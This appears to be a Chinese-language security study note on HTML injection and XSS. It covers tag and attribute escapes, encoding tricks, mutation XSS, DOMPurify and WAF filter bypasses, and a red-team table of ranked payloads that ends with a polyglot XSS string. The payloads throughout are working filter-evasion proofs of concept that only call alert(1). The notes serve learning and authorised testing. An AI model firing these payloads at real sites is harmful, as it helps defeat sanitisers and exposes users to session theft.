## 目录

- [[#一、HTML注入基础|一、HTML注入基础]]
- [[#二、Tag逃逸技术|二、Tag逃逸技术]]
- [[#三、属性逃逸技术|三、属性逃逸技术]]
- [[#四、编码绕过技术|四、编码绕过技术]]
- [[#五、mXSS（突变XSS）|五、mXSS（突变XSS）]]
- [[#六、过滤器对抗与绕过|六、过滤器对抗与绕过]]
- [[#七、WAF层面的HTML绕过|七、WAF层面的HTML绕过]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、HTML注入基础

### 什么是HTML注入

当用户可控的输入被嵌入HTML页面，且未经过正确的编码或过滤，就形成了HTML注入。

```
# 正常URL：https://example.com/search?q=hello
# 页面显示：<p>搜索结果：hello</p>

# 注入URL：https://example.com/search?q=<h1>HACKED</h1>
# 页面显示：<p>搜索结果：<h1>HACKED</h1></p>
# 结果：页面出现大号HACKED文字
```

### HTML注入与XSS的区别

| | HTML注入 | XSS |
|---|---------|-----|
| 注入内容 | HTML标签和属性 | 可执行脚本 |
| 危害 | 页面篡改、钓鱼 | 窃取Cookie、劫持会话 |
| 起因 | 未编码的HTML输出 | 同上，但需脚本执行 |

XSS是HTML注入的子集。能注入HTML不一定能注入script，但如果能注入HTML（尤其是事件属性）通常就能XSS。

### 注入发生的上下文

| 上下文 | 示例代码 | 利用方式 |
|-------|---------|---------|
| HTML标签间 | `<div>[INPUT]</div>` | 直接写HTML标签 |
| 属性值内 | `<input value="[INPUT]">` | 闭合引号，注入事件 |
| 注释内 | `<!-- [INPUT] -->` | 注入`--><script>` |
| script标签内 | `<script>var x="[INPUT]";</script>` | 闭合字符串，注入代码 |
| style标签内 | `<style>body { [INPUT] }</style>` | CSS注入 |
| URL属性内 | `<a href="[INPUT]">` | `javascript:`协议 |

## 二、Tag逃逸技术

### 场景1：黑名单过滤

如果过滤器移除特定关键词：

```html
# 输入
<scr<script>ipt>alert(1)</scr</script>ipt>

# 过滤后（假设移除<script>和</script>）
<script>alert(1)</script>

# 结果：XSS成功！
```

### 场景2：大小写绕过

```html
# 如果过滤器只检查小写
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
```

### 场景3：非标准标签

```html
# 利用不常见的可执行上下文标签
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### 场景4：利用HTML注释

```html
<!-- 输入 --><script>alert(1)</script>

# 页面代码变成：
<!-- 输入 --><script>alert(1)</script> -->

# 注释提前闭合，script被执行
```

## 三、属性逃逸技术

### 场景1：属性值逃逸

```html
# 原代码
<input value="[INPUT]">

# 输入
" onfocus="alert(1)" autofocus="

# 结果
<input value="" onfocus="alert(1)" autofocus="">
```

### 场景2：无引号属性分离

```html
# 原代码
<a href=[INPUT]>

# 输入（用空格分隔属性）
javascript:alert(1) onclick=alert(2)

# 结果
<a href=javascript:alert(1) onclick=alert(2)>
```

### 场景3：HTML5新属性

```html
# formaction 在 button/input 上
<button formaction="javascript:alert(1)">

# srcdoc 在 iframe 上
<iframe srcdoc="<script>alert(1)</script>">

# onanimationend 无需用户交互
<style>@keyframes x{}</style><div style="animation:x" onanimationend=alert(1)>
```

### 场景4：利用HTML实体

```html
# 输入（HTML实体编码的属性分隔符）
&#x22; onfocus=alert(1) autofocus &#x22;

# 如果浏览器先解码实体再解析属性：
<input value="&#x22; onfocus=alert(1) autofocus &#x22;">
# 变成
<input value="" onfocus="alert(1)" autofocus="">
```

## 四、编码绕过技术

### HTML实体编码

```
字符 实体名 实体编号
< &lt; &#60;
> &gt; &#62;
" &quot; &#34;
' &apos; &#39;
& &amp; &#38;
` &DiacriticalGrave; &#96;
```

### URL编码

```
# 在href/src等URL属性中
<javascript:alert(1)> → URL编码 → %6A%61%76%61%73%63%72...
# 注意：javascript: 部分编码后，浏览器仍可能解码后执行
```

### Base64编码

```html
# data URI + base64
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 多字节编码（UTF-7）

```html
# 如果Content-Type声明charset=utf-7
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
# 解码为 <script>alert(1)</script>
```

### JS字符串编码

```javascript
# HTML中的JS事件属性
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

# unicode转义
<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
```

## 五、mXSS（突变XSS）

### 原理

mXSS (Mutation XSS) 是最危险的HTML注入形式之一。核心原理：浏览器的HTML解析器和序列化器（如innerHTML）对同一字符串有不同的解析结果。

```
原始字符串 → 解析器A(innerHTML/过滤器) → 序列化
序列化后的HTML → 解析器B(页面渲染) → DOM
如果A和B的解析结果不同 → mXSS发生！
```

### 经典案例

**案例1：listing元素（已修复，但思路经典）**
```html
<listing><img src=x onerror=alert(1)></listing>

# innerHTML处理后的序列化：
<listing><img src=x onerror=alert(1)></listing>

# 页面渲染时，<listing>内容是原始文本，不解析子标签
# 但如果序列化格式不同（换行等），可能改变解析结果
```

**案例2：noscript元素**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# 在无JS环境中解析：
# <noscript>内的内容被原样渲染
# </noscript>闭合 → <img>触发
```

**案例3：svg + foreignObject**
```html
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>

# 在HTML模式解析和在SVG模式解析结果不同
```

### 检测mXSS

```javascript
// 构建测试payload
var payload = '<listing><img src=x onerror=alert(1)></listing>';
var div = document.createElement('div');
div.innerHTML = payload;
// 比较 innerHTML 前后的差异
console.log(div.innerHTML);
// 如果改变了 → 标记为mXSS候选
```

## 六、过滤器对抗与绕过

### 主流防御手段

| 防御方式 | 原理 | 弱点 |
|---------|------|------|
| HTML实体编码 | `<` → `&lt;` | 在不同上下文可能不够 |
| 标签白名单 | 仅允许如`<b><i><p>` | 属性注入可能被遗漏 |
| DOMPurify | 客户端HTML净化 | 曾被发现绕过漏洞 |
| CSP | 禁止内联脚本 | script-src `unsafe-inline`会削弱 |
| XSS Auditor | 浏览器内置 | 已从Chrome移除 |

### DOMPurify绕过示例

DOMPurify是业界标准的客户端HTML净化库，但历史上被绕过多次：

```
# 历史绕过（已修复，但展示思路）
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

# 利用HTML解析器的Foreign Content模式 + tree construction特性
```

### WAF绕过关键词

常见WAF关键词检测和绕过：
```
检测：<script, onerror, onload, javascript:, alert(, document.cookie
绕过：<svg/onload=...>, <details open ontoggle=...>
编码：\x3cscript\x3e, &#60;script&#62;
大小写：<ScRiPt>
空格替换：<img/onerror=...> (HTML5允许)
```

## 七、WAF层面的HTML绕过

### 多行payload

某些WAF只在单行内检查：

```
<img
src=x
onerror=
alert(1)>
```

### 注释混淆

```
# Chrome支持的条件注释（仅旧IE）
<!--[if IE]><script>alert(1)</script><![endif]-->

# // 在onerror中
<img src=x onerror="// 无害注释
alert(1)//">
```

### 标签嵌套

```
<div id="<script>alert(1)</script>">
# 某些过滤器的上下文分析错误，认为id值安全
# 但如果后续JS读取id并设置innerHTML...
```

## 八、红队视角总结

### 注入优先级（从简单到复杂）

| 等级 | 方式 | 成功率 |
|------|------|--------|
| 基础 | `<script>alert(1)</script>` | 低（常见防御） |
| 事件 | `<img src=x onerror=alert(1)>` | 中 |
| SVG | `<svg/onload=alert(1)>` | 中高 |
| 动画 | `<div style=animation:x onanimationend=alert(1)>` | 中高 |
| 编码 | Base64 data URI + iframe | 中 |
| mXSS | 解析器差异利用 | 低（但研究中） |
| Polyglot | 同时在多上下文有效的payload | 低-中 |

### Polyglot XSS示例

一个在HTML、属性、JS字符串三种上下文中都有效的payload：

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### 工具清单

| 工具 | 用途 |
|------|------|
| Burp Intruder | 批量payload测试 |
| XSStrike | 智能XSS检测 |
| dalfox | Go语言XSS扫描 |
| knoxss | 在线XSS检测（需注册） |
| PortSwigger XSS Cheat Sheet | 绕过payload库 |
| Hackvector (Burp插件) | 自动编码payload |

---
**返回** [[HTML基础总目录|HTML基础总目录]] | [[../前端基础总目录|前端基础总目录]]
